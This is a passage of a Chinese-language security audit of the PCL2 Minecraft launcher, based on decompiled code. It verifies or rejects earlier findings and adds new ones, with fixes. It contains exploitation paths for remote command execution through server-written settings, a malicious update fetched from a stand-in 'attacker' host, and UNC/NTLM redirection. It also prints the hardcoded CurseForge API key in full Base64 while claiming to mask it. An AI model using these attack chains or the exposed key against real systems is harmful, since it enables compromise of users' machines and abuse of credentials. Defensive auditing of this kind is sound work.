          .ToString().Trim('{', '}');                       // 硬件配置指纹
      ...
      return StringExtensions.Upper(GetStableHashCode(lastConfig + Settings.Get<string>("Identify"))
                                    .ToString("X"));       // 再混入安装级随机值，16 位十六进制
  }
  ```
  最终格式化为 `XXXX-XXXX-XXXX-XXXX`。它是一个**本地稳定标识**，不是硬件序列号的直接暴露。

  **(b) 请求链路里唯一被追加的参数是签名，不是标识**
  ```csharp
  internal static string SecretCdnSign(string UrlWithMark)
  {
      if (ModBase.ApplicationStartTick < 1) return UrlWithMark;
      if (!StringExtensions.EndsWithF(UrlWithMark, "{CDN}", false)) return UrlWithMark;

      string url  = UrlWithMark.Replace("{CDN}", "").Replace(" ", "%20");
      string rand = StringExtensions.EnsureLength(ModBase.RandomInteger(0, 2147483645).ToString("x"), '0', 8);
      string ts   = Conversions.ToString(ModBase.GetUnixTimestampUtc());
      string path = /* url 中 "://" 之后首个 "/" 起的部分 */;
      string sign = CryptographyUtils.ComputeHash(
          EnumerableExtensions.Join(new string[5] { path, ts, rand, "0", "PCL2****er" }, "-"), (HashMethod)0);
      return url + (url.Contains("?") ? "&" : "?") + "sign=" +
             EnumerableExtensions.Join(new string[4] { ts, rand, "0", sign }, "-");
  }
  ```
  全程序集范围内**不存在** `?id=` / `&id=` 形式的 URL 构造。

  **(c) `{UNIQUE}` 替换的方向是"下行模板填充"，不是上行**
  ```csharp
  foreach (JObject Notice in NoticeContent.Replace("{UNIQUE}", ModBase.Identify).DeserializeJson())
  ```
  这是"服务器在公告正文里留占位符，客户端本地把它换成自己的标识再展示/处理"。数据流向是**服务器 → 客户端**，不产生任何外发字节。

  **(d) 遥测不含标识**
  ```csharp
  ModMain.Telemetry("联机成功", "Server", ..., "NAT", ...);   // 事件名 + 业务枚举
  ```
  上报字段为版本、事件名、异常文本等，未见 `Identify`。

  **(e) 唯一"对外可见"的标识是联机主机名（非遥测）**
  ```csharp
  string arg2 = (IsServerSide ? "Server-" : "Client-") +
      StringExtensions.EnsureLength(
          MathUtils.ConvertRadix(StringExtensions.GetStableHashCode(ModBase.Identify), 36).TrimStart('-'), '0', 6);
  ...
  text3 += $" --hostname={arg2}";
  ```
  这是 EasyTier 对等网络里的节点名，压缩为 6 位 36 进制，**仅对同一联机房间内的对等节点可见**，不进入官方服务器。

- **为什么不成立**：
  1. 原文把"本地模板替换（`Replace("{UNIQUE}", Identify)`）"读成了"上行参数"，方向判断错误；
  2. 原文把自己的"行业惯例推测（`?v=&id=`）"当成了事实陈述，而 PCL2 的鉴权设计走的是另一条路——`sign` 参数（防 CDN 盗链），不是设备标识；
  3. 因此"跨会话追踪""传输中被截获"这两个衍生结论失去了事实基础。

- **原文为何会误判**：这是前序报告最典型的"外部符号不可见"代价。`SecretCdnSign` / `SecretHeadersSign` 不在 186 行公开代码里，只能靠"常见约定"猜。猜错方向，整条结论就偏了。

- **但必须指出两个真实的衍生问题**（本次新增，见 PCL2-2026-06）：
  - `Identify` 在**每次启动时明文写入日志**：`Logger.Info($"识别码：{ModBase.Identify}")`；
  - `Identify` 同时是凭据加密的**密钥材料**（`DesEncrypt(text, "PCL" + Identify)`）。
  也就是说，"不外发"是对的，"不泄露"是错的——泄露路径从"网络"变成了"日志 + 注册表"。

- **可能的利用方法**：（本项不成立，无对应利用路径）若需追踪，只能通过日志与本地文件，属另一问题域。
- **可能的后果**：（本项不成立）实际后果为本地隐私泄露，计入 PCL2-2026-06。
- **严重程度**：**❌ 不成立**（原 🟠 中危判定撤销）

---

##### PCL-MITM-001 传输层校验未知（自定义 HTTP 客户端可能禁用 TLS）— ❌ 不成立

- **类型**：中间人攻击前置风险
- **核验判定**：❌ **不成立（且已用运行时实验正/反验证）**
- **前序报告的假设**：
  > "在不少 Windows 桌面程序/启动器中……开发者常会设置 `ServicePointManager.ServerCertificateValidationCallback = Function(s, cert, chain, err) True`，即**无条件接受任何证书**。"

- **二进制事实**：

  **(a) 请求客户端未设置任何自定义校验回调**
  ```csharp
  RequestClient = ClientExtensions.CreateClient(
      (ICacheStore)new FileStore(ModBase.PathTemp + "Cache/Http/"),
      (HttpMessageHandler)new HttpClientHandler
      {
          AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
          UseCookies = false
      });
  ```
  `HttpClientHandler` 未指定 `ServerCertificateCustomValidationCallback`，走 .NET 默认校验链。

  **(b) 进程级回调确实存在，但只在特定设置写入时才安装；实际只放宽一个域，另有一条失败开放的兜底分支**
  ```csharp
  public static void ShouldValidateSslCertificateOnLogin(bool Enabled)
  {
      ServicePointManager.ServerCertificateValidationCallback = (Sender, Certificate, Chain, Failure) =>
      {
          HttpWebRequest req = Sender as HttpWebRequest;
          if (Failure == SslPolicyErrors.None) return true;
          Logger.Warn($"未通过 SSL 证书验证（{Failure}），提供的证书为 {Certificate?.Subject}，URL：{req?.Address}");
          if (req == null) return !Enabled;
          return (req.Address.Host.Contains("xboxlive") ||
                  req.Address.Host.Contains("minecraftservices")) && !Enabled;
      };
  }

  // 唯一调用点：设置项变更回调
  new Setting("ToolDownloadCert", false, Sources.Registry, Encrypted: false, a0 =>
  {
      ModNet.ShouldValidateSslCertificateOnLogin(Conversions.ToBoolean(a0));
  }),
  ```
  关键：`Setting` 构造函数**不调用** `OnChanged`，`Settings.Get` 也不调用。因此**默认运行期该回调根本没有被安装**。`ToolDownloadCert` 全程序集除定义外无任何引用（无 UI、无默认写入）。

  **(c) IP 直连不破坏主机名校验（本次运行时时测，最关键的一步）**

  PCL 的 `DNSLookup` 会把 URI 改写成字面 IP、把 `Host` 头设为原域名：
  ```csharp
  Request.Headers.Host = Request.RequestUri.Authority;
  Request.RequestUri = new UriBuilder(Request.RequestUri) { Host = iPAddress.ToString() }.Uri;
  ```
  直觉上这会破坏证书校验（因为 URI 的主机名变成了 IP）。**实测否定了这个直觉**——在 .NET Framework 4.8（与 PCL 同运行时）下：

  | 用例 | 结果 |
  |---|---|
  | `https://104.20.23.154/` + `Host: example.com` | **200 OK** —— 证书按 `Host` 头校验，通过 |
  | `https://104.20.23.154/` + `Host: wrong-name.example` | **失败**：`未能创建 SSL/TLS 安全通道` |

  反向用例证明"校验确实生效"，正向用例证明"IP 改写不会导致误判"。

- **为什么不成立**：
  1. 前提（"开发者禁用了证书校验"）**不存在**：既没有全局 `return true`，唯一存在的回调默认未安装；
  2. 即便安装，实际也只对 `minecraftservices` 一个域放宽（`xboxlive` 因 IP 改写使 `Address.Host` 变成 IP 而失效），**不影响 PCL 自有 CDN**；另有一条 `req == null` 时接受一切的兜底分支，但它只对非 `HttpWebRequest` 的调用生效，同样不覆盖 PCL 自有 CDN；
  3. "IP 直连会破坏校验"这一技术直觉被运行时实验否定。

- **原文为何会误判**：把"常见做法"当成了"本程序做法"，并且无法看到 `DNSLookup` 与 `HttpClientHandler` 的构造。这类"基于概率的推断"在安全评估中必须明确标注为假设——前序报告确实标注了，但随后又在结论中把它当作已成立的前置条件使用（"属未缓解的高危前置条件"），这是方法论上的滑移。

- **残留价值**：该回调本身构成一个**新的**中低危问题——它把"TLS 策略"暴露成了一个可被 `setup` 写入的开关，见 PCL2-2026-07。原文方向错、但"这个位置有东西"的直觉是对的。

- **可能的利用方法**：（本项不成立）实际可利用路径见 PCL2-2026-07（需先写入设置）。
- **可能的后果**：（本项不成立）
- **严重程度**：**❌ 不成立**（原 🟠 中危判定撤销）

---

##### PCL-CHAIN-001 链式远程代码执行（`{CDN}` 替换 + `setup` 组合）— ❌ 不成立

- **类型**：远程代码执行（攻击链）
- **核验判定**：❌ **不成立（占位符语义被完全误判）**
- **前序报告的假设**：
  > "如果 `{CDN}` 最终解析出的域名/基址由**可经 `setup` 动作改写的设置项**决定……则会形成一条干净的 RCE 攻击链。"

- **二进制事实**：
  `{CDN}` 的替换实现就是 3.1.3 中引用的 `SecretCdnSign`。其行为可归纳为：

  ```
  输入：https://pcl2-server-1253424809.file.myqcloud.com/ServerConfig.json{CDN}
  输出：https://pcl2-server-1253424809.file.myqcloud.com/ServerConfig.json?sign=<ts>-<rand>-0-<md5>
  ```
  - 替换结果只追加**查询参数**，`Scheme` / `Host` / `Port` / `Path` **全部不变**；
  - 函数不读取任何 `Settings`，只依赖 `ApplicationStartTick`、`RandomInteger`、`GetUnixTimestampUtc`；
  - 因此 `setup` 无论写什么键，都无法改变请求的目标主机。

- **为什么不成立**：`{CDN}` 不是"域名/基址占位符"，而是"CDN 防盗链签名占位符"。原文把它当成前者，于是推出一条根本不存在的重定向链。

- **原文为何会误判**：`{CDN}` 这个名字极具误导性——它读起来就像"CDN 地址"。在 186 行源码中，它只以字符串拼接的形式出现（`"...json{CDN}"`），看不到替换实现，猜成"域名占位符"几乎是必然的。这也说明：**变量/占位符命名本身是一个安全可用性问题**。

- **副作用（本次新增的独立弱点）**：该签名实现自身有三个缺陷——共享密钥硬编码在二进制中（8 字符，本报告遮蔽为 `PCL2****er`）、摘要算法为 MD5、签名仅覆盖 `path` 不含 `host`。这意味着任何人可从 exe 中提取密钥并自行签发"合法"URL。但其后果仅限于**绕过 CDN 防盗链**（例如盗刷流量），**不能**改变请求主机，故不构成 RCE 链。作为观察项记录，未单列漏洞。

- **可能的利用方法**：（本项不成立）签名密钥泄露可用于构造合法 `sign`，属资源滥用而非代码执行。
- **可能的后果**：（本项不成立）
- **严重程度**：**❌ 不成立**（原 🟠 中危判定撤销）

---

#### 3.1.4 🔽 成立但需降级/修正（2 项）

##### PCL-HARD-001 硬编码远端地址（单点信任）
- **类型**：单点信任 / 基础设施集中
- **核验判定**：🔽 **成立，但应定位为"设计风险"而非"可利用漏洞"，且实际硬编码点比原文更多**
- **源代码**：
  ```csharp
  "https://pcl2-server-1253424809.file.myqcloud.com/notice.cfg{CDN}"
  "https://pcl2-server-1253424809.file.myqcloud.com/ServerConfig.json{CDN}"
  "https://pcl2-server-1253424809.file.myqcloud.com/notice.json{CDN}"
  "https://pcl2-server-1253424809.file.myqcloud.com/minecraft/download.json{CDN}"   // 新增：特供版清单
  "https://ap-shanghai.cls.tencentcs.com/track?topic_id=pcl-remote-1253424809"       // 新增：遥测
  OAuthClientId = "fe72edc2-3a6f-4280-90e8-e2beb64ce7e1"                            // 新增：微软 OAuth（公开标识，非密钥）
  ```
- **说明**：原文判断（单点信任、单点故障、不可轮换）成立。降级理由：它本身不构成"可被利用的缺陷"，而是"爆炸半径放大器"，且与作者说明中"各文件权限相同、统一操作"的自述一致——**这恰恰意味着单点失陷即全量失陷**。作为独立条目保留，但严重度按"风险集中度"而非"可利用性"计。
- **可能的利用方法**：取得该 COS 桶写权限，或劫持其 DNS/证书链。
- **可能的后果**：全量客户端内容投毒。
- **严重程度**：🟠 中危（维持，但性质为设计风险）

##### PCL-LOG-001 日志信息泄露（含远端原始内容）
- **类型**：日志泄露
- **核验判定**：🔽 **成立，但泄露面需双向修正**
- **源代码**：
  ```csharp
  Logger.Info($"本地公告编号：{num2}，服务器公告：{text3}，需更新", ...);   // notice.cfg 原文
  Logger.Warn(text5, ...);                                                // notice.json 原文（解析失败时）
  Logger.Error(ex, $"读取 PCL 服务器公告失败（{text5.Length}）", (LogBehavior)1, ...);
  ```
- **说明**：
  1. ✅ 远端原文落盘成立。
  2. ❌ **原文担心的"`{UNIQUE}` 已替换为真实 Identify"不成立**：日志记录的是替换**之前**的 `text5`；替换发生在 `DeserializeJson` 的入参上，不影响已记录的字符串。
  3. ⚠️ **但存在更严重的实际泄露**：启动日志直接写入识别码与运行环境（见 PCL2-2026-06），信息量比"公告原文"大得多。
- **可能的利用方法**：收集用户上传的日志文件，拼装设备标识与凭据解密材料。
- **可能的后果**：服务器结构信息、设备识别码二次扩散。
- **严重程度**：🟡 低危（维持，但泄露内容需替换描述）

---

### 3.2 B 组：本次反汇编新增发现（8 项）

> 本节全部为前序报告未覆盖的问题。每一项都给出：完整源码结构拆解 → 为什么这里存在漏洞 → 攻击者如何利用 → 后果与定级。

#### PCL2-2026-01 `setup` → `LaunchAdvanceRun` → `cmd.exe /c`：持久化命令执行

- **类型**：远程代码执行 / 持久化（配置驱动的命令执行）
- **严重程度**：🔴 高危
- **源代码**：

  **第一段：设置项定义（`Source` 默认 `Sources.Normal`，即全局设置，`setup` 以 `Instance=null` 可正常写入）**
  ```csharp
  new Setting("LaunchAdvanceJvm",  "-XX:-OmitStackTraceInFastThrow -Djdk.lang.Process.allowAmbiguousCommands=True ..."),
  new Setting("LaunchAdvanceGame", ""),
  new Setting("LaunchAdvanceRun",  ""),
  ```

  **第二段：启动游戏时的执行点（`ModLaunch.McLaunchCustom`）**
  ```csharp
  private static void McLaunchCustom(ModLoader.LoaderTask<int, int> Loader)
  {
      string text = Settings.Get<string>("LaunchAdvanceRun");
      if (Operators.CompareString(text, "", TextCompare: false) != 0)
      {
          text = ModMain.ArgumentReplace(text);         // 仅替换 {identify} 等占位符，不做安全过滤
      }
      ...
      process = ModBase.StartProcess(new ProcessStartInfo
      {
          FileName = "cmd.exe",
          Arguments = $"/c \"{text}\"",                 // ← 设置值直接进命令行
          WorkingDirectory = ModMinecraft.McFolderSelected,
          UseShellExecute = false,
          CreateNoWindow = true
      });
  }
  ```

  **第三段：同函数的另一个落盘点（导出启动脚本）**
  ```csharp
  string raw = string.Format("{0}", ...) + "@echo off\r\n" + ...
             + text + "\r\n" + text2 + "\r\n" + $"\"{McLaunchJavaSelected.JavaExePath}\" {McLaunchArgument}" + ...;
  FileUtils.Write(CurrentLaunchOptions.SaveBatch ?? (Paths.Base + "PCL\\LatestLaunch.bat"),
                  ModMinecraft.FilterAccessToken(raw, 'F').Replace("%", "%%"),
                  (McLaunchJavaSelected.Version.Major > 8) ? Encoding.UTF8 : Encoding.Default);
  ```

- **说明（为什么这里存在漏洞）**：
  1. **数据流是三段拼接的**：`notice.json` 的 `actions.setup` 值 → `Settings.Set` → `Setup.ini` → 下次启动游戏时 `Settings.Get` → `cmd.exe /c`。攻击者不需要触碰任何可执行文件，只需要写一个字符串设置。
  2. **白名单不是安全边界**：`Setup` 的 `Entries` 白名单是按"用户能不能在 UI 里调这个"来划分的，`LaunchAdvanceRun` 是给高级用户的自定义命令功能，因此合法。但同一个白名单**同时**被服务器下发的 `setup` 使用，于是"高级用户功能"变成了"远程命令入口"。
  3. **没有二次确认**：`McLaunchCustom` 直接执行，不弹窗、不显示将要运行的命令（只在日志里写 `正在执行全局自定义命令：{text}`）。
  4. **持久化天然成立**：值写入 `Setup.ini`，重启、升级、重装启动器（保留配置）后仍存在；触发条件是"用户下次启动游戏"——这是启动器最高频的动作，几乎必然发生。
  5. **不需要管理员**：以当前用户权限运行即可窃取微软令牌、写 `HKCU\...\Run`、加密用户文档。作者的"不提权"论点在此不成立。
  6. **附加面**：同一字符串还会被原样拼进 `LatestLaunch.bat`（仅转义 `%`），若用户使用"导出启动脚本"功能，等于把攻击者的命令固化成批处理文件。
  7. **旁证**：`LaunchAdvanceJvm` 的默认值本身就包含 `-Dfml.ignoreInvalidMinecraftCertificates=True -Dfml.ignorePatchDiscrepancies=True`——PCL 默认就让 Forge 跳过 Minecraft jar 的证书与补丁一致性校验。这不是本漏洞的一部分（属于兼容性取舍），但说明"JVM 参数即信任边界"这一点在 PCL 中并未被当作安全事项处理；一旦该设置可被远端追加，即可向游戏进程注入任意 JVM 参数。
  8. **两条设置项不在同一量级**：Java **不支持** `-javaagent:http://...` 这样的远程 URL（agent 必须是本地文件），所以 `LaunchAdvanceJvm` 要走到代码执行，需要先有一个恶意 jar 落到本地（可配合 PCL2-2026-04 的目录可控实现），属于**二阶段执行**；而 `LaunchAdvanceRun` 是"一个字符串 → 一次 shell 调用"，**单步、无需任何文件落地**。修复排序上应先处理 `LaunchAdvanceRun`。

- **可能的利用方法**：
  ```
  [前置] 可改写 notice.json（CDN 写权限 / 可信证书中间人 / 本机写权限）
    ↓ 一次性、无按钮公告（PCL-SILENT-001）
  actions: { "setup": { "LaunchAdvanceRun": "<任意命令>" } }
    ↓ Settings.Set → Setup.ini（持久化）
  用户下次点击"启动游戏" → cmd.exe /c "<任意命令>"
  ```
- **可能的后果**：以用户权限持久化执行任意代码；无需更新包、无需哈希绕过、无需管理员；可长期驻留。
- **修复建议**：把 `LaunchAdvanceRun` / `LaunchAdvanceJvm` / `LaunchAdvanceGame` 从 `setup` 可写白名单中移除；若必须保留远程配置能力，改为"仅允许服务器下发**开关**，命令本体只能由用户在本机输入"。

---

#### PCL2-2026-02 `ServerConfig["Link"]["Argument"]` 直接拼入子进程命令行

- **类型**：命令/参数注入（配置驱动）
- **严重程度**：🔴 高危
- **源代码**：
  ```csharp
  // PageLinkMain：启动联机模块
  string text3 = (string)ModSecret.ServerConfig["Link"][(object)"Argument"];     // ← 服务器配置原样取出
  text3 += $" --network-name={NetworkName} --network-secret={NetworkSecret} --listeners {num}" +
           $" --rpc-portal {RPCPort} --private-mode true";
  ...
  foreach (string item in list)
  {
      text3 += $" -p=\"{item}\"";                                                // 节点列表同样来自配置
  }
  ProcessStart(text3);

  private void ProcessStart(string Arguments)
  {
      ProcessStartInfo startInfo = new ProcessStartInfo
      {
          FileName = PathEasyTier + "联机模块.exe",
          Arguments = Arguments,                                                 // ← 整串直接交给子进程
          UseShellExecute = false,
          CreateNoWindow = true,
          RedirectStandardError = true,
          RedirectStandardOutput = true
      };
      Logger.Info($"正在启动 EasyTier：{Arguments}", (LogBehavior)0, ...);        // ← 含 --network-secret
      ProcessCore = new Process { StartInfo = startInfo };
  }
  ```
- **说明（为什么这里存在漏洞）**：
  1. **拼接而非结构化**：`Argument` 是服务器下发的**完整字符串片段**，客户端既不解析、不校验、也不加引号，直接与客户端自己生成的参数**拼接**后传入 `Arguments`。
  2. **`UseShellExecute = false` 只是挡住了 shell 元字符**（`&`、`|`、`>` 不会被执行），**完全挡不住参数级注入**。攻击者可以在 `Argument` 里塞入任意 EasyTier 参数（如指定配置文件、追加对等节点、修改监听/转发/代理规则），或提前闭合后续参数。
  3. **`Argument` 本身就是第 0 个 token**：`text3` 以 `Argument` 开头，攻击者控制的是子进程命令行的**开头**，可以先用 `--xxx` 顶掉客户端自己追加的参数，也可以直接控制第一个位置参数，从而改变 EasyTier 的运行模式（例如从"加入房间"变成"本地转发/代理"），这对用户完全不可见（`CreateNoWindow = true`）。
  4. **第二个注入点：节点列表**。`foreach (string item in list) text3 += $" -p=\"{item}\""` 只用引号把值包起来，**没有转义引号本身**；`Peers` 里的一个 `"` 就能闭合引号并追加任意参数。这与上一条同源：拼接而非结构化。
  5. **被注入的目标二进制本身也不可信**：`EasyTier.zip` 从 `ServerConfig["Link"]["Downloads"]` 下载，只校验 `MinSize = 2097152`。也就是说，同一条配置投递既能换掉二进制、又能换掉参数。
  6. **次生泄露**：`Logger.Info($"正在启动 EasyTier：{Arguments}")` 把 `--network-secret`（房间密钥）明文写进日志。用户按惯例上传日志求助，等于泄露联机房间口令。
- **可能的利用方法**：
  - 篡改 `ServerConfig.Link.Argument` 注入参数 → 改变联机模块网络行为（开启额外监听、指定恶意对等节点、将流量导向攻击者）；
  - 篡改 `ServerConfig.Link.Downloads` + `EasyTierVersion` → 触发下载被替换的 `联机模块.exe`（仅 ≥2MB 校验）→ 直接执行任意程序；
  - 读取日志获得 `network-secret`，加入他人联机房间。
- **可能的后果**：联机流量劫持、内网穿透面扩大、任意代码执行（经替换二进制）、房间密钥泄露。
- **修复建议**：`Argument` 改为**结构化参数表**（键值白名单，逐项校验类型与范围），由客户端重新序列化；`EasyTier.zip` 增加 SHA-256；日志中对 `--network-secret` 做脱敏。

---

#### PCL2-2026-03 静默更新默认可用，更新包只校验"≥1MB"

- **类型**：不安全更新 / 权限门缺失
- **严重程度**：🔴 高危
- **源代码**：
  ```csharp
  // ① 权限门：常量
  private static bool HasUpdatePermission => true;

  // ② 门后的"输入土豆码"在 Release 里只是个提示，没有输入
  public static void InputPotatoCode(bool IsUpdating)
  {
      ModMain.Hint("请使用 PCL 正式版以继续更新！……");      // 仅提示，无输入框、无校验
  }
  internal static void GeneratePotatoCode() { }             // 空实现

  // ③ 更新包校验
  Task.Output = new ModNet.NetFile[1] { new ModNet.NetFile(urls, localPath) };        // 无 FileChecker
  NetDownloadByLoader(ServerConfig["Update"]["Release"]["DownloadUrls"], PathTemp + "Latest.zip",
                      Loader, new FileChecker { MinSize = 1048576 });               // 仅 1MB

  // ④ 落地
  if (FileUtils.Exists(exePath)) FileUtils.Delete(exePath, false);
  FileUtils.ExtractToDirectory(localPath, Paths.Base + "PCL\\", null);
  UpdateRestart(TriggerRestartAndByEnd: true);
  ```
- **说明（为什么这里存在漏洞）**：
  1. **"静默更新需要授权"这一设计意图没有落地**：`HasUpdatePermission` 是编译期常量 `true`，`InputPotatoCode` 连输入框都没有。因此 `slientupdate` 与 `update` 在 Release 版中**行为等价**——都是"服务器说更新就更新"，用户零确认。
  2. **`FileChecker` 有哈希能力但没接线**：`MeloongCore.FileChecker` 支持 32/40/64 位哈希，更新链一个都没传，只传了 `MinSize`。
  3. **落地方式最激进**：删掉正在运行的 exe → 解压覆盖 → 重启新 exe。整个过程没有备份、没有回滚点、没有签名校验，一旦投递成功即不可逆。
  4. **与 PCL-RCE-001 组合后链路最短**：`ServerConfig` 提供 URL，`notice` 提供触发动作，二者同源、同信任级、同一次投递即可完成。
- **可能的利用方法**：
  ```
  ServerConfig.Update.Release.DownloadUrls = ["https://attacker/pcl.zip"]
  notice.actions = { "slientupdate": {} }
    → HasUpdatePermission==true → UpdateStart(true)
    → 下载（仅 ≥1MB）→ 覆盖 PCL\Plain Craft Launcher 2.exe → UpdateRestart()
  ```
- **可能的后果**：全量客户端被替换为任意程序；供应链级 RCE。
- **修复建议**：删除 `HasUpdatePermission => true` 的旁路，改为"用户显式开启的一次性静默更新授权 + 审计日志"；更新包启用 `FileChecker { Hash = <SHA256> }` 并校验 Authenticode 发布者；`MsDelta` 补丁同样校验。

---

#### PCL2-2026-04 `SystemSystemCache` 使缓存与更新落盘目录可控

- **类型**：路径可控 / 不安全文件投放
- **严重程度**：🟠 中危
- **源代码**：
  ```csharp
  // 设置项：普通设置，setup 可写
  new Setting("SystemSystemCache", "", Sources.Registry),

  // 全局临时目录（类型初始化时计算，public static 可被运行期改写）
  public static string PathTemp =
      ((Operators.CompareString(Settings.Get<string>("SystemSystemCache"), "", TextCompare: false) == 0)
          ? (System.IO.Path.GetTempPath() + "PCL\\")
          : Settings.Get<string>("SystemSystemCache"))
      .ToString().Replace("/", "\\").TrimEnd('\\') + "\\";
  ```
- **说明（为什么这里存在漏洞）**：
  1. **`PathTemp` 是所有远端内容的落盘根**：`Cache\ServerConfig.json`、`Cache\Notice.json`、`Cache\Notice.cfg`、`Cache\Http\*`（HTTP 缓存）、`Latest.zip`、`Latest.exe`、`EasyTier.zip`、`联机模块.exe` 全在它下面。
  2. **文件名固定、内容服务器可控**：攻击者无法随意命名文件，但可以选目录。把"恶意 exe"精确投放到用户桌面/启动目录/某个被其它程序扫描的目录，配合固定文件名（如 `Latest.exe`、`Plain Craft Launcher 2.exe`），可显著提升社工成功率。
  3. **`setup` 一步即可改写**：该键在 `Entries` 白名单内，`Sources.Registry`，类型 `string`，无路径合法性校验（不检查是否在用户目录、是否是 UNC、是否是系统目录）。
  4. **UNC 路径面**：`PathTemp` 未禁止 `\\host\share\` 形式。若被设为 UNC 路径，PCL 会把远端内容写到网络共享，同时从该共享读取 `ServerConfig.json`——这等于把"内容源"部分迁移到了攻击者可控位置（且会触发 NTLM 认证外发，属次生风险）。
  5. **启动时的"不可用回退"只处理异常，不处理恶意**：代码在目录不可写时会 `Settings.Set("SystemSystemCache", "")` 回退，但一个**可写**的恶意目录不会触发回退。
  6. **与 `HintNotice` 组合可形成"免 CDN 的长期据点"**：`HintNotice`（公告提示的"已读"标记）也是 `setup` 可写的普通设置。把它设成一个极大值（例如 `int.MaxValue`），客户端会认为"公告已读到很靠后的编号"，从而**长期走"读取本地缓存公告"的分支**。于是：先用一次投递改写 `SystemSystemCache` 指向攻击者目录 + 写入 `HintNotice`，之后即使官方修好 CDN、公告恢复干净，客户端仍持续从攻击者目录读取旧公告。这把"一次性入口"变成了"可维持的据点"，因此本项的实际影响高于"目录可控"本身。
- **可能的利用方法**：
  - `setup { "SystemSystemCache": "C:\\Users\\<user>\\Desktop\\" }` → 后续更新包/`Latest.exe` 落到桌面；
  - 或设为 UNC 路径，使配置读取与 NTLM 认证同时被导向攻击者；
  - 与 `HintNotice` 组合：两次 `setup` 之后，投毒不再依赖内容分发链路。
- **可能的后果**：恶意文件被投放到攻击者指定位置；配置读取源部分可控；NTLM 凭据外发风险。
- **修复建议**：`SystemSystemCache` 从 `setup` 白名单移除；即使保留，也应校验为本地绝对路径、禁止 UNC、禁止系统目录，并在启动时对路径做规范化后比对白名单根。

---

#### PCL2-2026-05 硬编码 CurseForge API Key（Base64 "明文"）

- **类型**：硬编码凭据
- **严重程度**：🟠 中危
- **源代码**：
  ```csharp
  if (Url.Contains("api.curseforge.com") || Url.Contains("forgecdn.net"))
  {
      Req.Headers.Add("x-api-key",
          Encoding.Default.GetString(Convert.FromBase64String(
              "JDJhJDEwJDdXV1YxV0VMY3dYOFhwN2Q2OE1Icy41Z3JUeVpWYTZTeW55ZVN5TWgxcnNFODluSWEwOXpP")));
  }
  ```
- **说明（为什么这里存在漏洞）**：
  1. **Base64 只是编码，不是保护**：任何拿到 exe 的人一行命令即可还原。解码结果为 `$2a$10$7WWV1WEL…`（本报告遮蔽后段），是 bcrypt 形态的字符串，直接作为 `x-api-key` 使用——**它就是可用凭据本身**，不是哈希校验值。
  2. **触发条件宽泛**：`Url.Contains(...)` 是子串匹配，任何包含 `api.curseforge.com` 的 URL（含攻击者域名 `api.curseforge.com.evil.tld`）都会带上该头。这意味着该密钥会**被发送到非 CurseForge 主机**——一个可被主动利用的密钥外泄通道。
  3. **后果不对等**：密钥泄露 → 配额耗尽 / 按 Key 计费损失 / 平台侧封禁 → **全体用户的 Mod 下载功能同时失效**（单点失效）。
- **可能的利用方法**：
  - 从二进制提取密钥，自建客户端冒用（配额、计费、封禁）；
  - 构造形如 `https://api.curseforge.com.<attacker>/...` 的 URL 使 PCL 主动外发密钥（需能影响下载 URL 来源，例如整合包内的下载地址）。
- **可能的后果**：服务方经济损失与配额耗尽；密钥被封后全体用户功能失效。
- **修复建议**：改为服务端代理或短期令牌；`Contains` 匹配改为 `Uri.Host` 精确匹配（`host == "api.curseforge.com"`）。

---

#### PCL2-2026-06 凭据弱加密（DES-CBC 固定 IV）+ 识别码明文入日志

- **类型**：密码学实现缺陷 / 敏感信息落盘
- **严重程度**：🟠 中危
- **源代码**：
  ```csharp
  // ① 加密实现：DES-CBC，密钥由 "PCL"+Identify 的哈希十进制串截 8 位，IV 为固定常量
  private static readonly byte[] desInitialVector = Encoding.UTF8.GetBytes("95168702");

  private static string DesEncrypt(string sourceString, string key = null)
  {
      key = ((key == null) ? "@;$ Abv2"
                           : StringExtensions.EnsureLength(
                                 StringExtensions.GetStableHashCode(key).ToString(), 'X', 8).Substring(0, 8));
      byte[] bytes = Encoding.UTF8.GetBytes(key);
      using DESCryptoServiceProvider des = new DESCryptoServiceProvider();
      using MemoryStream ms = new MemoryStream();
      using CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(bytes, desInitialVector), CryptoStreamMode.Write);
      byte[] data = Encoding.UTF8.GetBytes(sourceString);
      cs.Write(data, 0, data.Length);
      cs.FlushFinalBlock();
      return Convert.ToBase64String(ms.ToArray());
  }

  // ② 调用点：密钥材料 = "PCL" + Identify
  text = DesEncrypt(text, "PCL" + ModBase.Identify);

  // ③ 被加密的设置项
  new Setting("CacheMsAccess", "", Sources.Registry, Encrypted: true),
  new Setting("CacheNidePass", "", Sources.Registry, Encrypted: true),
  new Setting("CacheAuthPass", "", Sources.Registry, Encrypted: true),
  new Setting("LoginNidePass", "", Sources.Registry, Encrypted: true),
  new Setting("LoginAuthPass", "", Sources.Registry, Encrypted: true),

  // ④ 启动日志：识别码明文落盘
  Logger.Info($"识别码：{ModBase.Identify}", ...);
  Logger.Info($"程序路径：{ModBase.PathExe}", ...);
  Logger.Info($"管理员权限：{WindowsUtils.HasAdminRole()}", ...);
  ```
- **说明（为什么这里存在漏洞）**：
  1. **算法本身已淘汰**：DES 有效密钥 56 位，现代算力下不具备保护强度；`DESCryptoServiceProvider` 在 .NET 中属遗留 API。
  2. **密钥完全可推导**：密钥 = `GetStableHashCode("PCL" + Identify)` 的十进制字符串补 `X` 至 8 位后截前 8 位。`Identify` 由"硬件配置 `LastConfig` + 安装级随机值"派生，**同一台机器上恒定**，且**被明文写进启动日志**。于是"日志 + 注册表导出"即可还原全部凭据。
  3. **固定 IV**：`95168702` 硬编码，相同明文产生相同密文，可直接做等价性比对（判断两个用户是否使用同一密码），且丧失 CBC 的语义安全性。
  4. **默认密钥存在**：`key == null` 时使用 `"@;$ Abv2"`，这是一个**硬编码的通用密钥**。任何调用方忘记传 key，其数据就是"全局同密钥"加密。
  5. **保护的资产是高价值的**：`CacheMsAccess` 是微软账号 AccessToken，`LoginAuthPass` / `LoginNidePass` 是第三方认证（authlib / Nide）密码。前者可直接接管 Minecraft 账号，后者常与其它站点复用。
- **可能的利用方法**：
  - 取得用户日志（论坛求助、客服工单、恶意软件收集）→ 读取 `识别码`；
  - 读取 `HKCU\Software\...\Setup.ini` 或注册表中的 `CacheMsAccess` / `LoginAuthPass` 密文；
  - 用 `"PCL" + Identify` 派生密钥、固定 IV 解密 → 获得 AccessToken / 密码。
- **可能的后果**：微软账号与第三方认证凭据泄露，账号被接管；由于密码复用，影响扩散到其它服务。
